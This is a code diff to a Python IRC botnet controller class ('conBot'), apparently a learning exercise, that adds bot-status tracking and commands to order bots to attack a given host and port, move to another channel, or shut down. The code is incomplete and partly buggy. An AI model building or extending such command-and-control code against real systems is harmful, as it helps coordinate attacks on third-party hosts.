@@ -18,8 +18,10 @@ class conBot:
 
     # BOT INFO
     botList = []
-    botSuccess = []
-    botFails = []
+    botsSuccessful = []
+    botsFailed = []
+    botsMoved = []
+    botsDisconnected = []
 
     def setup(self, host, port, channel, phrase):
         self.HOST = host
@@ -104,7 +106,7 @@ class conBot:
 
     # SEND A PRIVATE MESSAGE/COMMAND TO BOTS
     def sendCommand(msg):
-        toBot = "PRIVMSG " + CHANNEL + " :" + str(msg) + " " + conNick + " " + PHRASE + "\n"
+        toBot = "PRIVMSG " + CHANNEL + " :" + str(msg) + " " + PHRASE + "\n"
         IRCSOCKET.send(toBot.encode())
         return
 
@@ -149,6 +151,29 @@ class conBot:
             # somewhere send phrase to bot
             # check command
             # send command to bots for them to do
+            if (self.command[0] == "status"):
+                sendCommand(command[0])
+            elif (self.command[0] == "attack"):
+                if (len(self.command) == 3):
+                    self.botsSuccessful = []
+                    self.botsFailed = []
+                    sendCommand(userCommand)
+                else:
+                    print("Incorrect usage of command: attack <host-name> <port>")
+            elif (self.command[0] == "move"):
+                if(len(self.command) == 4):
+                    self.botsMoved = []
+                    sendCommand(userCommand)
+                else:
+                    print("Incorrect usage of command: move <host-name> <port> <channel>")
+            elif (self.command[0] == "quit"):
+                sys.exit(0)
+            elif (self.command[0] == "shutdown"):
+                self.botsDisconnected = []
+                sendCommand(self.command[0])
+            
+                
+                    
 
 
 
